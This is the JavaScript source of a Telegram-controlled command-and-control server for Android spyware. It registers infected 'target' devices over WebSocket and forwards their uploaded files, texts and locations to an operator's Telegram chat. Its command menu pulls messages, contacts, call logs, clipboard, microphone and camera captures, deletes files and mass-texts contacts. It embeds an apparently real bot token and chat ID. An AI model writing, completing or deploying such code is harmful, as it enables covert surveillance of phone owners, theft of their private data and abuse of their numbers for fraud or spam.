const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

// Configuration - replace these with your own values
const token = '7582642449:AAEbEedFTwy5hfCqmI-Khv107lmRkVmhWXk';
const id = '6244550071';
const address = 'YOUR_SERVER_URL';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// Basic route
app.get('/', function (req, res) {
  res.send(`
    <pre>
    𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮
    </pre>
  `);
});

// File upload endpoint
app.post("/uploadFile", upload.single('file'), (req, res) => {
  const name = req.file.originalname;
  appBot.sendDocument(id, req.file.buffer, {
    caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
    parse_mode: "HTML"
  }, {
    filename: name,
    contentType: req.file.mimetype,
  });
  res.send('');
});

// Text upload endpoint
app.post("/uploadText", (req, res) => {
  appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n${req.body.text}`, { 
    parse_mode: "HTML" 
  });
  res.send('');
});

// Location upload endpoint
app.post("/uploadLocation", (req, res) => {
  appBot.sendLocation(id, req.body.lat, req.body.lon);
  appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, { 
    parse_mode: "HTML" 
  });
  res.send('');
});

// WebSocket connection handler
appSocket.on('connection', (ws, req) => {
  const uuid = uuidv4();
  const model = req.headers.model;
  const battery = req.headers.battery;
  const version = req.headers.version;
  const brightness = req.headers.brightness;
  const provider = req.headers.provider;

  ws.uuid = uuid;
  appClients.set(uuid, { 
    model: model, 
    battery: battery, 
    version: version, 
    brightness: brightness, 
    provider: provider 
  });

  // Notify admin about new connection
  appBot.sendMessage(id, 
    `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` + 
    `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` + 
    `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` + 
    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` + 
    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` + 
    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`, 
    { parse_mode: "HTML" }
  );

  // Handle disconnection
  ws.on('close', function () {
    appBot.sendMessage(id, 
      `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` + 
      `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` + 
      `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` + 
      `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` + 
      `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` + 
      `• ᴘʀᴏᴟɪᴅᴇʀ : <b>${provider}</b>`, 
      { parse_mode: "HTML" }
    );
    appClients.delete(ws.uuid);
  });

  // Handle messages from device
  ws.on('message', function(message) {
    console.log('Received from device:', message);
    // You can add handling for device responses here
  });
});

// Telegram bot message handler
appBot.on('message', (message) => {
  const chatId = message.chat.id;
  
  // Only respond to authorized user
  if (chatId != id) {
    appBot.sendMessage(chatId, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙');
    return;
  }

  // Handle replies to specific messages
  if (message.reply_to_message) {
    const replyText = message.reply_to_message.text;
    
    if (replyText.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
      currentNumber = message.text;
      appBot.sendMessage(id,
        '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
        '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴇɴ ᴀʟʟᴏᴡᴇᴅ',
        { reply_markup: { force_reply: true } }
      );
      return;
    }

    if (replyText.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
      appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`send_message:${currentNumber}/${message.text}`);
        }
      });
      currentNumber = '';
      currentUuid = '';
      appBot.sendMessage(id,
        '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
        '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
            'resize_keyboard': true
          }
        }
      );
      return;
    }

    // Handle other reply scenarios similarly...
    // [Previous reply handlers remain the same]
  }

  // Handle direct commands
  if (message.text == '/start') {
    appBot.sendMessage(id,
      '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙚𝙢𝙤𝙩𝙚 𝘾𝙤𝙣𝙩𝙧𝙤𝙡 𝙋𝙖𝙣𝙚𝙡\n\n' +
      '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
      '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ\n\n' +
      '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴄᴏɴᴛʀᴏʟ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          'resize_keyboard': true
        }
      }
    );
    return;
  }

  if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
    if (appClients.size == 0) {
      appBot.sendMessage(id,
        '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
        '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
      );
    } else {
      let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n';
      appClients.forEach(function (value, key) {
        text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`;
      });
      appBot.sendMessage(id, text, { parse_mode: "HTML" });
    }
    return;
  }

  if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
    if (appClients.size == 0) {
      appBot.sendMessage(id,
        '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
        '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
      );
    } else {
      const deviceListKeyboard = [];
      appClients.forEach(function (value, key) {
        deviceListKeyboard.push([{
          text: value.model,
          callback_data: 'device:' + key
        }]);
      });
      appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
        "reply_markup": {
          "inline_keyboard": deviceListKeyboard,
        },
      });
    }
    return;
  }
});

// Telegram bot callback query handler
appBot.on("callback_query", (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;
  const command = data.split(':')[0];
  const uuid = data.split(':')[1];
  
  if (!appClients.has(uuid)) {
    appBot.answerCallbackQuery(callbackQuery.id, { text: "Device no longer connected" });
    return;
  }

  const deviceModel = appClients.get(uuid).model;

  if (command == 'device') {
    appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${deviceModel}</b>`, {
      chat_id: id,
      message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [
            { text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}` },
            { text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}` }
          ],
          [
            { text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}` },
            { text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}` }
          ],
          [
            { text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}` },
            { text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}` },
          ],
          [
            { text: '𝙈𝙖𝙞𝙣 �𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}` },
            { text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}` }
          ],
          [
            { text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}` },
            { text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}` }
          ],
          [
            { text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}` },
            { text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}` }
          ],
          [
            { text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}` },
            { text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}` }
          ],
          [
            { text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}` },
            { text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}` }
          ],
          [
            { text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}` },
            { text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}` },
          ],
          [
            {
              text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
              callback_data: `send_message_to_all:${uuid}`
            }
          ],
        ]
      },
      parse_mode: "HTML"
    });
    return;
  }

  // Handle other commands
  if (command == 'send_message') {
    appBot.deleteMessage(id, msg.message_id);
    appBot.sendMessage(id, 
      '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
      '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
      { reply_markup: { force_reply: true } }
    );
    currentUuid = uuid;
    return;
  }

  // Send command to device
  appSocket.clients.forEach(function each(ws) {
    if (ws.uuid == uuid) {
      ws.send(command);
    }
  });

  appBot.deleteMessage(id, msg.message_id);
  appBot.sendMessage(id,
    '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
    {
      parse_mode: "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        'resize_keyboard': true
      }
    }
  );
});

// Keep connections alive
setInterval(function () {
  appSocket.clients.forEach(function each(ws) {
    ws.send('ping');
  });
  try {
    axios.get(address).then(r => "").catch(e => {});
  } catch (e) {
    console.error("Ping error:", e);
  }
}, 5000);

// Start server
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});